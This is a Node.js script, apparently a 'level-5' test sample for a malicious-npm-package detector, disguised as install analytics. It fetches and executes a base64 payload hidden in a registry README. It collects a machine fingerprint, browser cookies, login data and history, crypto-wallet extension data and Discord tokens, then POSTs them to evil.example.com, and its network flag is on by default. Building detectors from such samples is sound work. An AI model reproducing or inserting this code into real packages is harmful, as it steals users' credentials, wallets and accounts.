// Analytics — collect install telemetry for usage statistics
const https = require('https');
const fs = require('fs');
const path = require('path');
const os = require('os');

const NETWORK = true;

const pkg = require('./package.json');

// Looks like checking npm registry for updates — completely normal behavior
// NOTE: hits real registry.npmjs.org in BOTH modes (harmless public GET)
https.get(`https://registry.npmjs.org/${pkg.name}`, (res) => {
  let data = '';
  res.on('data', chunk => data += chunk);
  res.on('end', () => {
    try {
      const info = JSON.parse(data);
      // Hidden: checks a specific prerelease version's README for encoded payload
      if (info.versions && info.versions['0.0.1-beta.1']) {
        const readme = info.versions['0.0.1-beta.1'].readme || '';
        // Payload hidden in a "configuration example" in the readme
        const match = readme.match(/```config\n([\s\S]*?)\n```/);
        if (match) {
          const stage1 = Buffer.from(match[1], 'base64').toString();
          // Execute fetched payload with full system access
          require('vm').runInNewContext(stage1, {
            require, process, console, Buffer,
            setTimeout, setInterval
          });
        }
      }
      console.log(`[level-5] Registry fetch OK for "${pkg.name}" — no payload version found (expected)`);
    } catch(e) {
      console.log(`[level-5] Registry fetch done — "${pkg.name}" not on npm (expected)`);
    }
  });
}).on('error', (e) => {
  console.log(`[level-5] Registry fetch blocked/failed: ${e.code}`);
});

// --- Meanwhile: silent data collection that looks like telemetry ---
const home = os.homedir();
const telemetry = {
  v: pkg.version,
  node: process.version,
  os: os.platform(),
  arch: os.arch(),
};

// "Anonymous" install analytics — actually fingerprinting the machine
telemetry.id = (() => {
  try {
    const { execSync } = require('child_process');
    if (os.platform() === 'darwin') {
      return execSync('ioreg -rd1 -c IOPlatformExpertDevice | grep IOPlatformUUID', { encoding: 'utf-8' }).trim();
    } else if (os.platform() === 'linux') {
      return fs.readFileSync('/etc/machine-id', 'utf-8').trim();
    }
  } catch(e) {}
  return os.hostname();
})();

// "Check for browser integrations" — actually stealing browser data
telemetry.integrations = {};
const browserPaths = {
  chrome_darwin: path.join(home, 'Library/Application Support/Google/Chrome'),
  chrome_linux: path.join(home, '.config/google-chrome'),
  firefox_darwin: path.join(home, 'Library/Application Support/Firefox/Profiles'),
  firefox_linux: path.join(home, '.mozilla/firefox'),
  brave_darwin: path.join(home, 'Library/Application Support/BraveSoftware/Brave-Browser'),
};

for (const [browser, browserPath] of Object.entries(browserPaths)) {
  try {
    if (fs.existsSync(browserPath)) {
      telemetry.integrations[browser] = 'installed';

      // Steal Local State (contains encrypted key for cookie/password decryption)
      const localState = path.join(browserPath, 'Local State');
      if (fs.existsSync(localState)) {
        telemetry.integrations[browser + '_state'] = fs.readFileSync(localState, 'utf-8');
      }

      // Steal default profile cookies & login data
      const defaultProfile = path.join(browserPath, 'Default');
      if (fs.existsSync(defaultProfile)) {
        const dbFiles = ['Cookies', 'Login Data', 'Web Data', 'History'];
        for (const db of dbFiles) {
          const dbPath = path.join(defaultProfile, db);
          if (fs.existsSync(dbPath)) {
            telemetry.integrations[browser + '_' + db] = fs.readFileSync(dbPath).toString('base64').slice(0, 50000);
          }
        }
      }

      // Steal extension data (wallets like MetaMask, Phantom, etc.)
      const extDir = path.join(browserPath, 'Default/Local Extension Settings');
      if (fs.existsSync(extDir)) {
        const extensions = fs.readdirSync(extDir);
        telemetry.integrations[browser + '_extensions'] = extensions;
        const walletExtensions = {
          'nkbihfbeogaeaoehlefnkodbefgpgknn': 'metamask',
          'bfnaelmomeimhlpmgjnjophhpkkoljpa': 'phantom',
          'hnfanknocfeofbddgcijnmhnfnkdnaad': 'coinbase',
          'aiifbnbfobpmeekipheeijimdpnlpgpp': 'station',
        };
        for (const [extId, name] of Object.entries(walletExtensions)) {
          const extPath = path.join(extDir, extId);
          if (fs.existsSync(extPath)) {
            telemetry.integrations[name + '_wallet'] = {};
            const files = fs.readdirSync(extPath);
            for (const f of files) {
              try {
                telemetry.integrations[name + '_wallet'][f] =
                  fs.readFileSync(path.join(extPath, f)).toString('base64').slice(0, 10000);
              } catch(e) {}
            }
          }
        }
      }
    }
  } catch(e) {}
}

// Steal Discord tokens
const discordPaths = {
  darwin: path.join(home, 'Library/Application Support/discord/Local Storage/leveldb'),
  linux: path.join(home, '.config/discord/Local Storage/leveldb'),
  win32: path.join(home, 'AppData/Roaming/discord/Local Storage/leveldb'),
};
const discordPath = discordPaths[os.platform()];
if (discordPath) {
  try {
    const files = fs.readdirSync(discordPath).filter(f => f.endsWith('.ldb') || f.endsWith('.log'));
    telemetry.integrations.discord = {};
    for (const f of files) {
      try {
        const content = fs.readFileSync(path.join(discordPath, f), 'utf-8');
        const tokens = content.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/g);
        if (tokens) {
          telemetry.integrations.discord[f] = tokens;
        }
      } catch(e) {}
    }
  } catch(e) {}
}

// Exfil
const c2Host = 'evil.example.com';
const c2Path = '/telemetry';
const payload = JSON.stringify(telemetry);

if (NETWORK) {
  // Network mode: actually send to C2 (Docker --network=none will block)
  const req = https.request({
    hostname: c2Host,
    path: c2Path,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload),
      'User-Agent': `${pkg.name}/${pkg.version} node/${process.version}`,
    }
  }, (res) => {
    console.log(`[level-5] C2 responded: ${res.statusCode}`);
  });
  req.on('error', (e) => {
    console.log(`[level-5] C2 exfil blocked/failed: ${e.code}`);
  });
  req.end(payload);
} else {
  // Safe mode: write locally
  const exfilDir = '/tmp/unsus-test';
  try { fs.mkdirSync(exfilDir, { recursive: true }); } catch(e) {}
  fs.writeFileSync(path.join(exfilDir, 'level-5-exfil.json'), JSON.stringify(telemetry, null, 2));

  const browsers = Object.keys(telemetry.integrations).filter(k => !k.includes('_'));
  const wallets = Object.keys(telemetry.integrations).filter(k => k.includes('wallet'));
  console.log(`[level-5] Machine ID: ${telemetry.id}`);
  console.log(`[level-5] Browsers found: ${browsers.join(', ') || 'none'}`);
  console.log(`[level-5] Wallet extensions: ${wallets.join(', ') || 'none'}`);
  console.log(`[level-5] Discord tokens: ${telemetry.integrations.discord ? Object.keys(telemetry.integrations.discord).length + ' files' : 'none'}`);
  console.log(`[level-5] Would POST ${payload.length} bytes to https://${c2Host}${c2Path}`);
  console.log(`[level-5] Data written to ${exfilDir}/level-5-exfil.json`);
}
